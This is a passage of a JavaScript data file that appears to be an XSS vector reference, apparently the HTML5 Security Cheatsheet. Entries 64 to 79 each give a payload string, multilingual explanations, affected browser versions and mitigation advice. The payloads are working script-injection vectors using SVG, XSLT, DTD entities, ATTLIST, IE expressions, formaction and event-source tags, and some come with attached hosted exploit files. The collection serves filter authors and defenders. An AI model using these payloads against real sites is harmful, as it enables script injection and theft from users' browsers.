            'ja' : '',
            'ru' : 'Chrome и Safari разрешают использовать внешние ссылки на источники, которые определяют XML-эквиваленты. Это приводит к тому, что в данном примере эквивалент &x; заполняется содержимым внешнего файла. Документ должен быть отдан в качестве XML или XHTML. Ссылку на файл с определением эквивалента следует указывать как абсолютную.',
            'cs' : 'Chrome a Safari umožňují použití externích XML entit k referenci payloadu pro entitu. Příklad ukazuje entitu &x;, která je naplněna obsahem souboru. Dokument musí být dodán jako XML nemo XHTML.',
            'de' : ''
        },
        'urls'    : ['http://xmlwriter.net/xml_guide/entity_declaration.shtml', 'http://www.w3.org/TR/REC-xml/', '#67', '#76'],
        'howtofix'   : {
            'en' : 'In case an attacker can inject data into the DOCTYPE area of the targeted website it\'s easy to fool filtering mechanisms since the actual payload is hidden in a harmless looking entity. Make sure no injections in that area are possible.',
            'ja' : '',
            'ru' : 'В случае, если атакующий может внедрять данные в область DOCTYPE целевого сайта, создается возможность простейшего обхода механизма фильтрации, поскольку полезная нагрузка скрывается за безопасным на первый взгляд эквивалентом. Убедитесь, что инъекции невозможны в данной области.',
            'cs' : 'V případě, že útočník může aplikovat data do oblasti DOCTYPE cílové webové stránky, je snadné oklamat filtrovací mechanismy, protože skutečný payload je skryt v neškodně vyhlížející entitě. Ujistěte se, že nejsou možné žádné injekce v této oblasti.',
            'de' : ''
        },                        
        'browsers'   : {
            'chrome': ['3.0', '4.0', '5.0', '6.0', '7.0', '8.0', '9.0', '10.0', '23.0'],
            'safari': ['3.0', '4.0', '5.0', '5.1.7']
        },
        'tags'       : ['xss', 'javascript', 'xxe', 'safari', 'chrome', 'xml', 'entities', 'doctype'],
        'reporter'   : '.mario'
    },    
    { /* ID 65 - SVG element allows automatic execution of onload attribute without other SVG elements */
        'id'         : 65,
        'category'   : 'svg', 
        'name'       : {
            'en' : 'SVG element allows automatic execution of onload attribute without other SVG elements.',
            'ja' : '',
            'ru' : 'SVG-элементы и обработчик onload',
            'cs' : 'Spuštění JavaScriptu událostí load v elementu SVG',
            'de' : ''
        },
        'data'       : '<svg onload="%js_uri_alert%" xmlns="http://www.w3.org/2000/svg"></svg>',        
        'description': {
            'en' : 'SVG tags allow code to be executed with onload without any other elements.',
            'ja' : '',
            'ru' : 'SVG-элемент поддерживает атрибут onload, позволяющий автоматически выполнить JavaScript в отсутствие любых других элементов. Данный обработчик поддерживается большинством SVG-элементов. Чтобы увидеть их полный список, обратитесь к приведенной документации.',
            'cs' : 'Element SVG umožňuje automatické spuštění skriptu událostí load bez vložení dalších SVG dat.',
            'de' : ''
        },
        'urls'    : ['http://www.w3.org/TR/SVG11/attindex.html', 'http://www.w3.org/TR/SVGTiny12/attributeTable.html'],
        'howtofix'   : {
            'en' : 'Not really a bug to fix, this is desired behaviour and only increases XSS scope.',
            'ja' : '',
            'ru' : '',
            'cs' : 'Toto není tak docela chyba k opravě. Jde o žádoucí chování, které ovšem rozšiřuje možnosti XSS.',
            'de' : ''
        },                        
        'browsers'   : {
            'chrome': ['4.0', '5.0', '6.0', '7.0', '8.0', '9.0', '10.0', '23.0'],
            'safari': ['3.4', '4.0', '5.0', '5.1.7'],
            'firefox': ['2.0', '3.0', '4.0', '15.0'],
            'opera': ['9.x', '10.0', '11.0', '12.0'],
            'internet explorer': ['9.0']
        },
        'tags'       : ['xss', 'svg', 'onload','chrome','firefox','safari','opera'],
        'reporter'   : 'gareth'
    },
    { /* ID 66 - Opera XML-stylesheets executing JavaScript (2) */
        'id'         : 66,
        'category'   : 'xml', 
        'name'       : {
            'en' : 'Opera XML-stylesheets executing JavaScript (2)',
            'ja' : '',
            'ru' : 'Вызов javascript из тега xml-stylesheet в Opera',
            'cs' : 'Spuštění JavaScriptu skrz XML-stylesheet (2)',
            'de' : ''
        },
        'data'       : '<?xml version="1.0"?>\n<?xml-stylesheet type="text/xsl" href="data:,%3Cxsl:transform version=\'1.0\' xmlns:xsl=\'http://www.w3.org/1999/XSL/Transform\' id=\'xss\'%3E%3Cxsl:output method=\'html\'/%3E%3Cxsl:template match=\'/\'%3E%3Cscript%3E%js_alert%%3C/script%3E%3C/xsl:template%3E%3C/xsl:transform%3E"?>\n<root/>',
        'description': {
            'en' : 'Opera supports xml-stylesheet via data URIs. There are many ways to execute javascript using the XSL (XSLT). If you put this code in an external file on the same domain, then it will work in all browsers. It is also possible appeal to the code of the stylesheet by id (href = "#xss"), when the stylesheet implemented in the current document.',
            'ja' : '',
            'ru' : 'Opera поддерживает загрузку xml-таблицы стилей с помощью data-схемы. Существует очень много способов выполнить javascript, используя XSL (XSLT). Если вы разместите приведенный код таблицы стилей во внешнем файле, расположенном на том же домене, то он cработает во всех браузерах. Допустимо также обращение к коду таблицы стилей посредством идентификатора (href="#xss"), если таблица стилей внедрена в текущий документ.',
            'cs' : 'Opera podporuje xml-stylesheet s direktivou data:. To nabízí mnoho cest pro spuštění JavaScriptu užitím XSL (XSLT). Pokud uložíš tento kód do externího souboru ve stejné doméně, pak bude fungovat ve všech webových prohlížečích. Také je možné se odvolat na id stylu, který je vložen v aktuálním dokumentu (href="#xss").',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'cs' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'opera': [
                '8.0', '9.0', '10.0', '11.0', '12.0', 'mobile'
            ]
        },
        'tags'       : ['xss', 'javascript', 'opera', 'xslt', 'xsl', 'stylesheet', 'xml'],
        'reporter'   : 'LeverOne'
    },
    { /* ID 67 - XML ATTLIST declaration causing JavaScript execution */
        'id'         : 67,
        'category'   : 'xml', 
        'name'       : {
            'en' : 'XML ATTLIST declaration causing JavaScript execution',
            'ja' : '',
            'ru' : 'XML ATTLIST декларация влечет исполнение JavaScript',
            'cs' : 'Spuštění JavaScriptu deklarací XML ATTLIST',
            'de' : ''
        },
        'data'       : '<!DOCTYPE x [\r\n\t<!ATTLIST img xmlns CDATA "http://www.w3.org/1999/xhtml" src CDATA "xx:x"\r\n onerror CDATA "%js_alert%"\r\n onload CDATA "%js_alert_2%">\r\n]><img />',
        'description': {
            'en' : 'XML ATTLIST declarations can be used to create attributes and assign values for matching tags inside the DOCTYPE declaration. By chosing the right namespace and attribute combinations it\'s possible to create an ATTLIST declaration causing JavaScript execution without user interaction.', 
            'ja' : '',
            'ru' : 'XML-декларация списка атрибутов (ATTLIST declaration) - еще один вариант использования возможности влиять на DOCTYPE в xml-документе. Такие инъекции имеют практическое значение в тех случаях, когда пользователям предоставлена возможность загружать определенные файлы на сервер, подвергающиеся фильтрации. В данном примере мы видим, определение атрибутов, которые появляются у тега по умолчанию при его дальнейшем использовании.',
            'cs' : 'Deklarace XML ATTLIST může být použita k vytvoření atributů a přiřazení hodnot u odpovídajících tagů uvnitř deklarace DOCTYPE. Volbou správné kombinace názvu a atributu umožní ATTLIST deklarace spustit kód JavaScriptu bez spoluúčasti uživatele.',
            'de' : ''
        },
        'urls'    : ['http://xmlwriter.net/xml_guide/attlist_declaration.shtml', '#64', '#76'],
        'howtofix'   : {
            'en' : 'In case a website is being delivered as XML or XHTML make sure an attacker has no possibility to inject data into the DOCTYPE or create new ATTLIST directives.',
            'ja' : '',
            'ru' : 'В случае, если страница отдается сервером как XML или XHTML, убедитесь, что атакующий не может внедрять данные в область DOCTYPE.',
            'cs' : 'V případě, že jsou webové stránky definovány jako XML nebo XHTML se ujistěte, že útočník nemá možnost vložit data do DOCTYPE, nebo vytvořit nové ATTLIST direktivy.',
            'de' : ''
        },                        
        'browsers'   : {
            'chrome': ['4.0', '5.0', '6.0', '7.0', '8.0', '9.0', '10.0', '23.0'],
            'safari': ['3.0', '4.0', '5.0', '5.1.7'],
            'firefox': ['3.0', '4.0', '15.0'],        
            'opera': ['8.0', '9.0', '10.0', '11.0', '12.0', 'mobile']
        },
        'tags'       : ['xss', 'javascript', 'opera', 'attlist', 'doctype', 'chrome', 'firefox', 'safari'],
        'reporter'   : '.mario'
    },
    { /* ID 68 - Passive JavaScript execution via XLinks */
        'id'         : 68,
        'category'   : 'xml', 
        'name'       : {
            'en' : 'Passive JavaScript execution via XLinks',
            'ja' : '',
            'ru' : 'Пассивный скриптинг с помощью XLink',
            'cs' : 'Spuštění pasivního JavaScriptu skrz XLinks',
            'de' : ''
        },
        'data'       : '<doc xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:html="http://www.w3.org/1999/xhtml">\r\n\t<html:style /><x xlink:href="%js_uri_alert%" xlink:type="simple">XXX</x>\r\n</doc>',
        'description': {
            'en' : 'Gecko based browsers like Firefox allow using XLinks. Those can be equipped with a JavaScript URI to execute JavaScript in case the user clicks on one of those XLinks.', 
            'ja' : '',
            'ru' : 'В Gecko-браузерах, таких как Firefox, реализована частичная поддержка спецификации XLink. При этом XLink разрешает использовать псевдоскрипт в качестве URL.',
            'cs' : 'Prohlížeče založené na G-čku, jako je třeba Firefox, mohou používat XLink. Ty mohou obsahovat URI v podobě direktivy javascript:, jejichž kód se spustí po kliknutí na některý z těchto XLinků.',
            'de' : ''
        },
        'urls'    : ['http://www.w3.org/TR/xlink/', 'http://www.w3.org/TR/2010/REC-xlink11-20100506/', '#81', '#87'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'cs' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'firefox': ['3.0', '3.5', '3.6', '3.6.28', 'end']
        },
        'tags'       : ['xss', 'javascript', 'xlink', 'firefox', 'xml'],
        'reporter'   : '.mario'
    },
    { /* ID 69 - Opera WML JavaScript execution via timer event */
        'id'         : 69,
        'category'   : 'xml', 
        'name'       : {
            'en' : 'Opera WML JavaScript execution via timer event',
            'ja' : '',
            'ru' : 'Исполнение JavaScript в WML с помощью события timer',
            'cs' : 'Opera WML - Spuštění JavaScriptu skrz událost timer',
            'de' : ''
        },
        'data'       : '<card xmlns="http://www.wapforum.org/2001/wml"><onevent type="ontimer"><go href="%js_uri_alert%"/></onevent><timer value="1"/></card>',
        'description': {
            'en' : 'Opera supports WML files - Wireless Markup Language. As soon as a file has the extension .wml Opera assumes it\'s a WML and renders it accordingly. With a timer event and a connected redirect it\'s possible to execute JavaScript without user interaction.', 
            'ja' : '',
            'ru' : 'Opera реализовала поддержку WML (языка беспроводной разметки) и специальных файлов с расширением .wml, разметка в которых по умолчанию будет рассматриваться как принадлежащая к пространству имен wml. Событие timer в соединении с перенаправлением позволяет достичь исполнения JavaScript без взаимодействия с пользователем.',
            'cs' : 'Opera podporuje WML soubory (Wireless Markup Language). Ve chvíli, kdy má soubor příponu wml, předpokládá Opera, že jde o wml a odpovídajícím způsobem jej zpracovává. Pomocí časovače a využitím následného přesměrování je možné spustit kód JavaScriptu bez zásahu uživatele.',
            'de' : ''
        },
        'urls'    : ['http://www.w3schools.com/wap/default.asp', 'http://www.w3schools.com/wmlscript/default.asp','#83'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'cs' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'opera': ['9.x', '10.0', '11.0', '12.0', 'mobile']
        },
        'tags'       : ['xss', 'javascript', 'wmlscript', 'wml', 'opera', 'mobile', 'timer'],
        'reporter'   : '.mario'
    },
    { /* ID 70 - JavaScript execution via IE filters and onfilterchange */
        'id'         : 70,
        'category'   : 'html', 
        'name'       : {
            'en' : 'JavaScript execution via IE filters and onfilterchange',
            'ja' : '',
            'ru' : 'исполнение JavaScript с использованием IE-фильров и onfilterchange',
            'cs' : 'Spuštění JavaScriptu skrz IE filtr a onfilterchange',
            'de' : ''
        },
        'data'       : '<div style=width:1px;filter:glow onfilterchange=%js_alert%>x</div>',
        'description': {
            'en' : 'In some situations it\'s possible to trigger a filterchange event by using just one filter as the example shows. Also the short filter notation is being used which is supported by all IE versions despite the information in the documentation. In compatibility mode to IE8+ you can use the property "-ms-filter".', 
            'ja' : '',
            'ru' : 'Данный вектор из числа тех, которые позволяют наиболее эффективно использовать возможность изменять разметку внутри уязвимого тега без возможности выйти за его пределы. Вызов события происходит даже при однократном назначении фильтра перехода (а точнее событие происходит по окончании перехода, что ожидаемо).  Обратите внимание, что синтаксис фильтров может принимать такую сокращенную форму, несмотря на отсутствие упоминания об этом в документации. Универсальность данного способа ограничена только тем, что уязвимый тег должен иметь отображаемое содержимое, к которому применим фильтр. В режиме совместимости с IE8+ вы можете использовать свойство -ms-filter.',
            'cs' : 'Jak ukazuje příklad, je někdy možné spustit událost filterchange pomocí pouze jednoho filtru. také je použit krátký zápis filtru, který je podporován všemi verzemi IE. V režimu kompatibility pro IE8 + můžete použít vlastnost "-ms-filter".',
            'de' : ''
        },
        'urls'    : ['http://msdn.microsoft.com/en-us/library/ms532847%28VS.85%29.aspx' , 'http://msdn.microsoft.com/en-us/library/ie/hh801215(v=vs.85).aspx'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'cs' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'internet explorer': ['6.0', '7.0', '8.0', '9.0', 'end']
        },
        'tags'       : ['xss', 'javascript', 'filter', 'css', 'style', 'onfilterchange', 'internet explorer'],
        'reporter'   : '.mario'
    },
    { /* ID 71 - Closing tags accepting style attributes */
        'id'         : 71,
        'category'   : 'css', 
        'name'       : {
            'en' : 'Closing tags accepting style attributes',
            'ja' : '',
            'ru' : 'Закрывающий тег воспринимает атрибут style',
            'cs' : '',
            'de' : ''
        },
        'data'       : '<// style=x:expression\\28%js_write%\\29>',
        'description': {
            'en' : 'An unnamed closing tag can still contain style attributes on IE as the example shows. For extra obfuscation a bogus CSS property is being used to execute the JavaScript via expression() combined with CSS escapes. This example works up to IE 7 standards mode.', 
            'ja' : '',
            'ru' : 'В данном примере показано, как тег, имеющий синтаксис закрывающего, воспринимает стилевой атрибут.  Выполнение JavaScript произойдет в режиме совместимости, а также в режиме стандартов IE 7↓. Однако возможность распознавания стилевого атрибута в таком теге сохраняется вплоть до режима стандартов IE8. В строгом смысле данные теги нельзя рассматривать в качестве закрывающих. Это особый вид тегов для Internet Explorer, которые данный браузер в указанных режимах считает пользовательскими. Пример работает вплоть до режима стандартов IE 7.',
            'cs' : 'Uzavírací tag bez uvedeného názvu tagu může v IE obsahovat atributy stylu, tak jak můžete vidět v uvedeném příkladu. Pro další zamlžení útoku je použíta falešná vlastnost CSS a metoda expression() kombinovaná s escapováním znaků.',
            'de' : ''
        },
        'urls'    : ['http://msdn.microsoft.com/en-us/library/ms537634%28VS.85%29.aspx', 'http://www.w3.org/TR/CSS2/syndata.html'],
        'howtofix'   : {
            'en' : 'Make sure the HTML filter you use deals with unnamed closing tags and doesn\'t consider them to be plain text. Also be aware of CSS escapes and how they can completely obfuscate any style info inside <STYLE> tags and "style" attributes.',
            'ja' : '',
            'ru' : 'Убедитесь, что ваш HTML-фильтр, анализирует в том числе закрывающие теги.',
            'cs' : 'Ujistěte se, že HTML filtr počítá i s použitím nepojmenovaného uzavíracího tagu a nepovažuje jej za prostý text. Také počítat s CSS escapováním a vědět, jak může zamlžit jakýkoliv styl uvnitř tagu <STYLE> a atributu "style".',
            'de' : ''
        },                        
        'browsers'   : {
            'internet explorer': ['6.0', '7.0', '8.0', '9.0']
        },
        'tags'       : ['xss', 'javascript', 'closing tag', 'css', 'style', 'expression', 'internet explorer', 'quirks mode'],
        'reporter'   : 'Gareth, .mario'
    },
    { /* ID 72 - XSS via formaction - requiring user interaction (2) */
        'id'         : 72, 
        'category'   : 'html5', 
        'name'       : {
            'en' : 'XSS via formaction - requiring user interaction (2)',
            'ja' : '',
            'ru' : 'XSS через formaction - требуется взаимодействие с пользователем (2)',
            'cs' : 'XSS použitím formaction - vyžaduje uživatelskou interakci (2)',
            'de' : ''
        },
        'data'       : '<form><button formaction="%js_uri_alert%">X</button>',
        'trigger': 'document.getElementsByTagName("button")[0].click()',
        'description': {
            'en' : 'A vector displaying the HTML5 "formaction" capabilities for form hijacking. Note that this variation does not use the "id" and "form" attributes to connect button and form.',
            'ja' : '',
            'ru' : 'Вектор ещё раз демонстрирует возможности HTML5-атрибута formaction по захвату формы. Поскольку тег <INPUT> находится внутри формы, атрибуты id и form не требуются.',
            'cs' : 'Vektor ukazuje možnost použití HTML5 "formaction" pro form hijacking. Všimněte si, že tato varianta nepoužívá atributy "id" a "form" pro spojení tlačítka a formuláře.',
            'de' : ''
        },
        'urls'    : ['http://www.whatwg.org/specs/web-apps/current-work/multipage/association-of-controls-and-forms.html#attr-fs-formaction'],
        'howtofix'   : {
            'en' : 'Don\'t allow users to submit markup containing "form" and "formaction" attributes or transform them to bogus attributes.',
            'ja' : '',
            'ru' : 'Не разрешайте пользовательскую разметку, содержащую атрибуты form и formaction или неправильные значения этих атрибутов.',
            'cs' : 'Nedovolte, aby uživatelé odeslali tagy obsahující "form" a atribut "formaction" nebo je transformujte je na falešné atributy.',
            'de' : ''
        },
        'browsers'   : {
            'firefox': ['4.0', '15.0'],
            'opera': ['10.5', '11.0', '12.0', 'mobile'], 
            'chrome': ['10.0', '23.0'],
            'safari': ['4.0.4', '5.1.7'],
            'internet explorer': ['10.0']
        },
        'tags'       : ['xss', 'html5', 'opera', 'formaction', 'javascript', 'button'],
        'reporter'   : '.mario'
    },
    { /* ID 73 - Server-sent events - Opera and <EVENT-SOURCE> tags (1) */
        'id'         : 73,
        'category'   : 'behavior', 
        'name'       : {
            'en' : 'Server-sent events - Opera and <EVENT-SOURCE> tags (1)',
            'ja' : '',
            'ru' : 'События с сервера в Opera и тег <EVENT-SOURCE> (1)',
            'cs' : 'Server-sent událost - Opera a tag <EVENT-SOURCE> (1)',
            'de' : ''
        },
        'data'       : '<event-source src="%event_path%" onload="%js_alert%">',
        'attachment' : {
            'required_mime' : '',
            'crossdomain'    : '1',            
            'path'          : 'http://html5sec.org/event.php',
            'name'          : 'event.php',
            'raw'           : '<?php\r\nheader("Content-Type: application/x-dom-event-stream");\r\ndie("Event: load\\ndata: \\n\\n");\r\n?>'
        },
        'description': {
            'en' : 'Opera allows using <EVENT-SOURCE> elements. In case the "src" attribute points to a valid cross domain source it\'s possible to have the element listen for events and the containing data.',
            'ja' : '',
            'ru' : 'Opera поддерживает тег <EVENT-SOURCE>. Если src атрибут указывает на правильный междоменный источник, становится возможным послать в тег событие и содержащиеся в ответе сервера данные.',
            'cs' : 'Opera umožňuje použití tagů <EVENT-SOURCE>. V případě, že atribut "src" odkazuje na platný zdroj napříč doménami, je možné zachytit události a obsahující data.',
            'de' : ''
        },
        'urls'    : ['http://hixie.ch/specs/html/server-sent-events/server-sent-events'],
        'howtofix'   : {
            'en' : 'Make sure users cannot influence the source of <EVENT-SOURCE> elements and don\'t whitelist the tag itself inside user submitted markup.',
            'ja' : '',
            'ru' : 'Убедитесь, что пользовательский ввод не может содержать тег <EVENT-SOURCE>.',
            'cs' : 'Ujistěte se, že uživatelé nemohou ovlivnit zdroj tagů <EVENT-SOURCE> a tagy samotné nejsou uvedeny ve whitelistu.',
            'de' : ''
        },                        
        'browsers'   : {
            'opera': ['8.x', '9.0', '10.0', '10.63', 'end', 'mobile 10.00', 'mobile 10.10', 'end']
        },
        'tags'       : ['xss', 'javascript', 'event-source', 'opera', 'sse'],
        'reporter'   : '.mario'
    },
    { /* ID 74 - Server-sent events - Opera and <EVENT-SOURCE> tags (2) */
        'id'         : 74,
        'category'   : 'behavior', 
        'name'       : {
            'en' : 'Server-sent events - Opera and <EVENT-SOURCE> tags (2)',
            'ja' : '',
            'ru' : 'События с сервера в Opera и тег <EVENT-SOURCE> (2)',
            'cs' : 'Server-sent událost - Opera a tag <EVENT-SOURCE> (2)',
            'de' : ''
        },
        'data'       : '<a href="%js_uri_alert%"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A" /></a>',
        'description': {
            'en' : 'Opera allows using <EVENT-SOURCE> tags to receive server-sent events. In this example a data URI is being used as an event source triggering a click on another HTML element. In an attack scenario an XSS requiring user interaction can be turned into an active script execution this way.',
            'ja' : '',
            'ru' : 'В примере показан способ послать в тег ссылки событие click с помощью тега <EVENT-SOURCE> и таким образом выполнить JavaScript без взаимодействия с пользователем. В случае необходимости послать событие в какой-либо внешний тег на странице, событие с сервера должно содержать поле Target со значением идентификатора тега (см. приведенную документацию).',
            'cs' : 'Opera umožňuje použití tagů <EVENT-SOURCE> pro přijímání server-sent událostí. V tomto příkladu je datové URI, které se použije po výskytu události. Pro spuštění je potřeba kliknout na některý HTML prvek. Během XSS útoků, které vyžadují interakci s uživatelem, může být tento způsob použit pro spuštění aktivního skriptu.',
            'de' : ''
        },
        'urls'    : ['http://hixie.ch/specs/html/server-sent-events/server-sent-events'],
        'howtofix'   : {
            'en' : 'Make sure users cannot influence the source of <EVENT-SOURCE> elements and don\'t whitelist the tag itself inside user submitted markup.',
            'ja' : '',
            'ru' : 'Убедитесь, что пользовательский ввод не может содержать тег <EVENT-SOURCE>.',
            'cs' : 'Ujistěte se, že uživatelé nemohou ovlivnit zdroj tagů <EVENT-SOURCE> a tagy samotné nejsou uvedeny ve whitelistu.',
            'de' : ''
        },                        
        'browsers'   : {
            'opera': ['8.x', '9.0', '10.0', '10.63', 'end', 'mobile 10.00', 'mobile 10.10', 'end']
        },
        'tags'       : ['xss', 'javascript', 'event-source', 'opera', 'sse'],
        'reporter'   : '.mario'
    },
    { /* ID 75 - E4X used to close an opening <SCRIPT> tag and {} evaluation */
        'id'         : 75,
        'category'   : 'e4x', 
        'name'       : {
            'en' : 'E4X used to close an opening <SCRIPT> tag and {} evaluation',
            'ja' : '',
            'ru' : '',
            'cs' : 'E4X užito k zavření otevřeného tagu <SCRIPT> a použití {}',
            'de' : ''
        },
        'data'       : '<script<{%js_alert%}/></script </>',
        'description': {
            'en' : 'In this example an E4X object is being used to close a half-open <SCRIPT> tag and evaluate code in the global scope afterwards via the E4X curly bracket delimiters. This technique will not work anymore as soon Firefox uses the already integrated HTML5 parser (html5.enable=true)',
            'ja' : '',
            'ru' : 'В данном примере E4X-объект использован для закрытия дескриптора и в то же время для выполнения кода, содержащегося внутри специфических E4X-ограничителей {}. Такая техника не сработает, как только Firefox будет использовать уже интегрированный в него HTML5-парсер (html5.enable=true).',
            'cs' : 'V tomto příkladu je objekt E4X použit k uzavření pootevřeného tagu <SCRIPT> a k následnému spuštění kódu v globálním rozsahu přes E4X oddělovače, kterými jsou složené závorky. Tato technika nebude fungovat, pokud již Firefox používá integrovaný HTML5 parser (html5.enable = true).',
            'de' : ''
        },
        'urls'    : ['https://developer.mozilla.org/en/E4X', 'https://bugzilla.mozilla.org/show_bug.cgi?id=564706'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'cs' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'firefox': ['1.5', '2.0', '3.0', '3.6.28', 'end']
        },
        'tags'       : ['xss', 'javascript', 'e4x', 'script', 'parser', 'regex'],
        'reporter'   : '.mario, Gareth'
    },
    { /* ID 76 - Arbitrary payload injection via XML external DTD in IE */
        'id'         : 76,
        'category'   : 'xml', 
        'name'       : {
            'en' : 'Arbitrary payload injection via XML external DTD in IE',
            'ja' : '',
            'ru' : 'Инъекция удаленного javascript-кода через внешнее определение типа документа (DTD)',
            'cs' : 'Libovolná injekce kódu skrz XML externí DTD v IE',
            'de' : ''
        },
        'data'       : '<?xml-stylesheet type="text/css"?><!DOCTYPE x SYSTEM "test.dtd"><x>&x;</x>',
        'attachment' : {
            'required_mime' : '',
            'crossdomain'    : '1',            
            'path'          : 'http://html5sec.org/test.dtd',
            'name'          : 'test.dtd',
            'raw'           : '<!ENTITY x "&#x3C;html:img&#x20;src=\'x\'&#x20;xmlns:html=\'http://www.w3.org/1999/xhtml\'&#x20;onerror=\'%js_alert%\'/&#x3E;">'
        },
        'description': {
            'en' : 'IE will render doctype-provided entities in the "html" namespace as soon as a user defined XML stylesheet tag is present. The example works up to IE 8 standards mode.',
            'ja' : '',
            'ru' : 'IE для отображения HTML-тегов требует обязательного наличия на xml-странице пользовательской таблицы стилей, а также объявления соответствующего пространства имен с префиксом "html". Пример работает вплоть до режима стандартов IE 8.',
            'cs' : 'Internet Explorer bude renderovat doctype entity ve jmeném prostoru "html" ve chvíli, kdy je zobrazen uživatelem definovaný tag XML stysheet.',
            'de' : ''
        },
        'urls'    : ['#64', '#67'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'cs' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'internet explorer': ['6.0', '7.0', '8.0', '9.0']
        },
        'tags'       : ['xss', 'javascript', 'internet explorer', 'xml', 'dtd', 'arbitrary'],
        'reporter'   : 'LeverOne'
    },
    { /* ID 77 -  XML JavaScript execution via CSS in IE  */
        'id'         : 77,
        'category'   : 'xml', 
        'name'       : {
            'en' : 'XML JavaScript execution via style attribute in IE',
            'ja' : '',
            'ru' : 'Выполнение javascript c помощью стилевого атрибута в IE на XML-странице',
            'cs' : 'XML spuštění JavaScriptu přes atribut style v IE',
            'de' : ''
        },
        'data'       : '<?xml-stylesheet type="text/css"?><root style="x:expression(%js_write%)"/>',
        'description': {
            'en' : 'IE supports the style attribute in xml-pages too. Thus JavaScript can be executed via expression() with any given tag. The example works up to IE 7 standards mode.',
            'ja' : '',
            'ru' : 'IE поддерживает стилевой атрибут на xml-страницах. Таким образом javascript может быть выполнен в любом теге. Пример работает вплоть до режима стандартов IE 7.',
            'cs' : 'IE podporuje atribut styl na xml stránkách. JavaScript tak může být proveden pomocí metody expression() u daného tagu.',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'cs' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'internet explorer': ['6.0', '7.0', '8.0', '9.0']
        },
        'tags'       : ['xss', 'javascript', 'internet explorer', 'xml', 'css', 'style'],
        'reporter'   : 'LeverOne'
    },
    { /* ID 78 - Arbitrary payload injection via XSL + XDR-schema in IE */
        'id'         : 78,
        'category'   : 'xml', 
        'name'       : {
            'en' : 'Arbitrary payload injection via XSL + XDR-schema in IE',
            'ja' : '',
            'ru' : 'Инъекция удаленного javascript-кода в IE с помощью XSL и XDR-схемы',
            'cs' : 'Libovolná injekce kódu skrz XSL + XDR-schema v IE',
            'de' : ''
        },
        'data'       : '<?xml-stylesheet type="text/xsl" href="#"?><img xmlns="x-schema:%xdr_path%"/>',
        'attachment' : {
            'required_mime' : '',
            'crossdomain'    : '1',            
            'path'          : 'http://html5sec.org/test.xdr',
            'name'          : 'test.xdr',
            'raw'           : '<?xml version="1.0"?>\n<Schema name="x" xmlns="urn:schemas-microsoft-com:xml-data">\n<ElementType name="img">\n<AttributeType name="src" required="yes" default="x"/>\n<AttributeType name="onerror" required="yes" default="%js_alert%"/>\n<attribute type="src"/>\n<attribute type="onerror"/>\n</ElementType>\n</Schema>'
        },
        'description': {
            'en' : 'The namespace "html" is automatically determined using XSL. Missing attributes for the <img> tag such as "onerror" are obtained from the XDR-schema - and will then execute JavaScript. The example works up to IE 8 standards mode.',
            'ja' : '',
            'ru' : 'Пространство имен html автоматически определяется IE с помощью XSL-таблицы. Недостающие атрибуты для тега <img> заимствуются из XDR-схемы. Пример работает вплоть до режима стандартов IE 8.',
            'cs' : 'Užitím XSL je automaticky určen jmenný prostor "html". Chybějící atributy v tagu <img> jako "onerror" jsou získány z XDR-schama a následně spustí kód JavaScriptu.',
            'de' : ''
        },
        'urls'    : ['http://msdn.microsoft.com/en-us/library/ms256208(v=VS.100).aspx'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'cs' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'internet explorer': ['6.0', '7.0', '8.0', '9.0']
        },
        'tags'       : ['xss', 'javascript', 'internet explorer', 'xml', 'xdr', 'arbitrary', 'xml data reduced', 'xsl'],
        'reporter'   : 'LeverOne'
    },
    { /* ID 79 - <OBJECT> tag and Flash files executing JavaScript */
        'id'         : 79,
        'category'   : 'html', 
        'name'       : {
            'en' : '<OBJECT> tag and Flash files executing JavaScript',
            'ja' : '',
            'ru' : 'Использование тега <OBJECT> и Flash для исполнения JavaScript',
            'cs' : 'JavaScript s využitím tagu <OBJECT> a Flashového souboru',
            'de' : ''
        },
        'data'       : '<object allowscriptaccess="always" data="%swf_path%"></object>',
        'description': {
            'en' : '<OBJECT> tags directly including Flash files via the "data" attribute - allowing execution of JavaScript and more without user interaction.',
            'ja' : '',
            'ru' : 'Тег <OBJECT> с помощью атрибута data вставляет на страницу флеш-файл, который вызывает JavaScript, делая запрос с псевдоскриптом в качестве URL.',
            'cs' : 'Tagy <OBJECT> načítající přímo Flashové soubory v atributu "data" umožňují spuštění JavaScriptu bez uživatelské interakce.',
            'de' : ''
        },
        'attachment' : {
            'required_mime' : '',
            'crossdomain'    : '1',            
            'path'          : 'http://html5sec.org/test.swf',
            'name'          : 'test.swf',
            'raw'           : 'class XSS {public static function main() {\r\nflash.Lib.getURL(new flash.net.URLRequest(flash.Lib._root.url||"%js_uri_alert%"),flash.Lib._root.name||"_top");\r\n}}'
        },        
        'urls'    : ['http://www.w3.org/TR/REC-html40/struct/objects.html'],
        'howtofix'   : {
            'en' : 'Make sure users cannot control the "src" and "data" attribute values of <OBJECT> tags - or better don\'t whitelist <OBJECT> tags in user submitted markup at all.',
            'ja' : '',
            'ru' : 'Убедитесь, что пользователи не могут контролировать атрибуты src и data тега <OBJECT>, или лучше - не заносите тег <OBJECT> в белый лист пользовательской разметки.',
            'cs' : 'Ujistěte se, že uživatelé nemohou ovlivňovat hodnoty atributů "src" a "data" tagů <OBJECT>, nebo ještě lépe, že nejsou tagy <OBJECT> vůbec povoleny whitelistem.',
            'de' : ''
        },                        
        'browsers'   : {
